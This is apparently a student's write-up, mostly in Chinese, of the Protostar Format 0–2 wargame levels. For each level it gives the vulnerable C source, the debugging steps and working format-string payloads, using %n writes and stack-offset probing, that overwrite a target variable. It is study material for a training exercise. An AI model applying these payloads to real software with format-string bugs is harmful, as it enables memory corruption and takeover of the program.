# Protostar: Format 0

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

> **Hints**
>
> - This level should be done in less than 10 bytes of input.
> - “Exploiting format string vulnerabilities”

This level is at `/opt/protostar/bin/format0`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
    volatile int target;
    char buffer[64];

    target = 0;

    sprintf(buffer, string);

    if(target == 0xdeadbeef) {
        printf("you have hit the target correctly :)\n");
    }
}

int main(int argc, char **argv)
{
    vuln(argv[1]);
}
```



## 攻击目标

使程序输出：`you have hit the target correctly :)`。



## 攻击过程

```shell
$ cat format0.py
buffer = "%64c"
target = "\xef\xbe\xad\xde"
print buffer + target
$ ./format0 `python format0.py`
you have hit the target correctly :)
```

<img src=".\format0-result.png" style="zoom:67%;" />



## 原理分析

这是一道典型的简单栈溢出题，几乎与格式化字符串无关。

查看`vuln()`的汇编代码：

<img src=".\format0-disassemble.png" style="zoom:67%;" />

可以分析出函数执行过程中栈空间变化如图所示：

<img src=".\format0-analysis-1.png" style="zoom: 80%;" />

`sprintf()`会将`string`指向的内容赋给`buffer`，但并不检查其是否超过64B。所以我们可以将`argv[1]`设置为64个字符+0xdeadbeef，这样`target`就会被覆写为0xdeadbeef，函数会进入if分支，输出`you have hit the target correctly :)`。

题目要求输入小于10B，所以采用格式化字符串的方式设计攻击脚本。

```python
#　format0.py
buffer = "%64c"
target = "\xef\xbe\xad\xde"
print buffer + target
```



<div STYLE="page-break-after: always;"></div>

# Protostar: Format 1

This level shows how format strings can be used to modify arbitrary memory locations.

> **Hints**
>
> - objdump -t is your friend, and your input string lies far up the stack :)

This level is at `/opt/protostar/bin/format1`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
    printf(string);

    if(target) {
        printf("you have modified the target :)\n");
    }
}

int main(int argc, char **argv)
{
    vuln(argv[1]);
}
```



## 攻击目标

使程序输出：`you have modified the target :)`。



## 攻击过程

```shell
(gdb) r $(python -c 'print "\x38\x96\x04\x08" + "AAAAA" + "%08x."*131 + "[%08n]"')
...
you have modified the target :)
```

<img src=".\format1-result-1.png" style="zoom: 67%;" />

```shell
$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "AAAAA" + "%08x."*122 + "[%08n]"')
...
you have modified the target :)
```

<img src=".\format1-result-2.png" style="zoom: 67%;" />



## 原理分析

`printf()`读取内存的原理如图所示：

<img src=".\format1-analysis-1.png" style="zoom:67%;" />

如果没有为`printf()`准备恰当的参数，`printf()`会直接根据格式化字符串的要求读取内存中的数据。

`printf()`修改内存的原理如下：

```c
# include <stdio.h>
int main() {
    int bytes_format = 0;
    char *buffer;
    printf("AAAA%.20x%n", buffer, &bytes_format); // %.20x：打印buffer，不足20字符的用0在前面补齐；%n：不打印如何内容，统计已打印的字符串的字符数，赋值给bytes_format
    printf("This string has %d bytes.", bytes_format);
    return 0;
}

/*
Output:
AAAA000000000000b7fd7ff4This string has 24 bytes.
*/
```

上述程序在栈上的执行原理如图所示：

<img src=".\format1-analysis-2.png" style="zoom:67%;" />

结合`printf()`的读取漏洞分析，如果我们没有为`printf()`准备恰当的参数，`printf()`会将紧挨着读取地址后的地址内储存的内容视为一个指针，将统计到的字节数写入该“指针”指向的地址。

因此，如果我们可以构造一个格式化字符串，使得图中的*somewhere恰好指向target的地址，就可以改变target的值（从0到非0）。

<img src=".\format1-analysis-3.png" style="zoom:67%;" />

在上图的格式化字符串中，我们可以修改“AAAA”的部分，让它恰好等于target的地址，然后我们可以加长“%.20x”的部分，让*somewhere恰好与我们构造的target的地址重合。

<img src=".\format1-analysis-4.png" style="zoom:67%;" />

先通过objdump获取target的地址：

```shell
$ objdump -t format1 | grep target # 查看target的地址
```

<img src=".\format1-analysis-5.png" style="zoom:67%;" />

查看`vuln()`的汇编代码：

<img src=".\format1-disassemble.png" style="zoom:67%;" />

在leave处（0x0804841a）打断点，先尝试输入一个短一点的字符串“DDDD%08x”。

```shell
(gdb) b *0x0804841a
(gdb) r DDDD%08x.
```

<img src=".\format1-analysis-6.png" style="zoom:67%;" />

查看栈上内容，找到“DDDD%08x”的存储位置。

```shell
(gdb) x/160wx $esp
```

<img src=".\format1-analysis-7.png" style="zoom:67%;" />

<img src=".\format1-analysis-8.png" style="zoom:67%;" />

栈顶（0xbffffcd0）存着指针*string（0xbffffee5），指向“DDDD%08x.”。

```shell
(gdb) x/1s 0xbffffee5
```

<img src=".\format1-analysis-9.png" style="zoom:67%;" />

计算栈顶到字符串的偏移值，约为133DWORD。

```shell
(gdb) shell python -c 'print 0xbffffee5-0xbffffcd0'
```

<img src=".\format1-analysis-10.png" style="zoom:67%;" />

改变输入进行调试，直到*somewhere恰好与要填入target地址的位置重合。

```shell
(gdb) r $(python -c 'print "DDDD" + "%08x."*150 + "[%08x]"') # 调试，直到[]里的值为44444444
```

<img src=".\format1-analysis-11.png" style="zoom:67%;" />

```shell
(gdb) r $(python -c 'print "DDDD" + "%08x."*132 + "[%08x]"') # 调试，直到[]里的值为44444444
```

<img src=".\format1-analysis-12.png" style="zoom:67%;" />

```shell
(gdb) r $(python -c 'print "DDDD" + "%08x."*131 + "[%08x]"') # 调试，直到[]里的值为44444444
```

<img src=".\format1-analysis-13.png" style="zoom:67%;" />

```shell
、(gdb) r $(python -c 'print "DDDD" + "AAAAA" + "%08x."*131 + "[%08x]"') # []里的值为44444444
```

<img src=".\format1-analysis-14.png" style="zoom:67%;" />

现在*somewhere恰好与要填入target地址的位置重合，我们把“DDDD”改为target的地址，将最后的%08x改为%08n进行写入。

```shell
(gdb) r $(python -c 'print "\x38\x96\x04\x08" + "AAAAA" + "%08x."*131 + "[%08n]"')
```

<img src=".\format1-analysis-15.png" style="zoom:67%;" />

攻击成功！

但是退出gdb后执行，该攻击脚本失效，程序输出Segmentation fault。

下面直接在命令行调试。

```shell
$ ./format1 $(python -c 'print "DDDD" + "%08x."*131 + "[%08x]"')
```

<img src=".\format1-analysis-16.png" style="zoom:67%;" />

发现偏移改变了，经过几次改变输入调试后重新得到正确的偏移。

```shell
$ ./format1 $(python -c 'print "DDDD" + "AAAAA" + "%08x."*122 + "[%08x]"')
```

<img src=".\format1-analysis-17.png" style="zoom:67%;" />

现在*somewhere恰好与填入target地址的位置重合。

```shell
$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "AAAAA" + "%08x."*122 + "[%08x]"')
```

<img src=".\format1-analysis-18.png" style="zoom:67%;" />

最后得到攻击脚本如下：

```shell
$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "AAAAA" + "%08x."*122 + "[%08n]"')
```

<img src=".\format1-result-2.png" style="zoom:67%;" />

> “……使用 gdb 可以方便的获取程序动态运行状态下的信息，但**通过 gdb 动态调试获取的诸如缓冲区的起始地址等信息可能与程序实际运行时的信息并不相同**，从而影响缓冲区溢出实践的效果。……”——[针对 Linux 环境下 gdb 动态调试获取的局部变量地址与直接运行程序时不一致问题的解决方案...(https://blog.csdn.net/weixin_34301307/article/details/94754425 )]
>
> “通过gdb调试获取的内存分配是虚拟的，可能与实际情况有所不同。”——助教

<div STYLE="page-break-after: always;"></div>

# Protostar: Format 2

This level moves on from format1 and shows how specific values can be written in memory.

This level is at `/opt/protostar/bin/format2`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);

    if(target == 64) {
        printf("you have modified the target :)\n");
    } else {
        printf("target is %d :(\n", target);
    }
}

int main(int argc, char **argv)
{
    vuln();
}
```



## 攻击目标

使程序输出：`you have modified the target :)`。



## 攻击过程

```shell
$ python -c 'print "\xe4\x96\x04\x08" * 10 + "%08x" * 3 + "%08n"' | ./format2 
...
you have modified the target :)
```

<img src=".\format2-result.png" style="zoom:67%;" />



## 原理分析

分析源码：

```c
fgets(buffer, sizeof(buffer), stdin); // 不存在缓冲区溢出漏洞
```

我们要利用的漏洞仍然是`printf()`的读写漏洞。

<img src="D:\个人文件夹\template\大三下\计算机系统安全\Protostar\Format0-2\format2-analysis-1.png" style="zoom:67%;" />

同Format1，关键点仍然在于计算*string到输入`buffer`的偏移值。

```shell
$ objdump -t format2 | grep target # 查看target的地址
```

<img src=".\format2-analysis-2.png" style="zoom:67%;" />

先尝试利用`printf()`读取较多的栈上内容，计算从栈顶*string到输入`buffer`的偏移值。

```shell
$ python -c 'print "DDDD" + "%08x." * 10' | ./format2 # 计算出偏移值为3DWORD
```

<img src=".\format2-analysis-3.png" style="zoom:67%;" />

利用偏移值，将target的地址填入，让target对齐我们要进行写入的位置。

```shell
$ python -c 'print "\xe4\x96\x04\x08" + "%08x" * 3 + "%08x"' | ./format2 # # 
```

<img src=".\format2-analysis-4.png" style="zoom:67%;" />

在%08n前拼凑出长度为64的字符串，得到攻击脚本如下：

```shell
$ python -c 'print "\xe4\x96\x04\x08" * 10 + "%08x" * 3 + "%08n"' | ./format2 # # 在%08n前拼凑出长度为64的字符串
```

<img src=".\format2-result.png" style="zoom:67%;" />
